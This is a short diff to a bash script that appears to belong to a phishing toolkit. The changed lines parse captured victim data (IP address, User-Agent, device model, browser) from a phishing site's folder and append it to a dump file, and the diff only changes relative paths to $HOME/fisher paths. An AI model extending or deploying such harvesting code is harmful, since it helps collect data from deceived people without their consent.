@@ -624,7 +624,7 @@ ip=$( egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:
 IFS=$'\n'
 ua=$(grep 'User-Agent:' webs/$site/ip.txt | cut -d '"' -f2)
 echo -e "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m$ua\e[0m\e[1;77m\e[0m\n"
-chk=$(fmt -20 webs/$site/ip.txt)
+chk=$(fmt -20 $HOME/fisher/webs/$site/ip.txt)
 sch=$(echo "$chk" > cod.txt)                                                                                                         
 dom1=$(sed -n '5p' cod.txt | cut -d"(" -f2 | cut -d";" -f1)
 dom2=$(sed -n '6p' cod.txt | cut -d"(" -f2 | cut -d";" -f1)
@@ -638,7 +638,7 @@ echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Model:\e[1;0m$dom3\e[0m"
 echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Browser:\e[0m$dom4\e[0m"
 echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Version:\e[1;0m$dom5\e[0m"
 echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Device:\e[1;0m$dom6\e[0m"
-cat webs/$site/ip.txt >> webs/$site/dump.ip.txt
+cat $HOME/fisher/webs/$site/ip.txt >> $HOME/fisher/webs/$site/dump.ip.txt
 
 if [[ -e location.txt ]]; then
 rm -rf location.txt
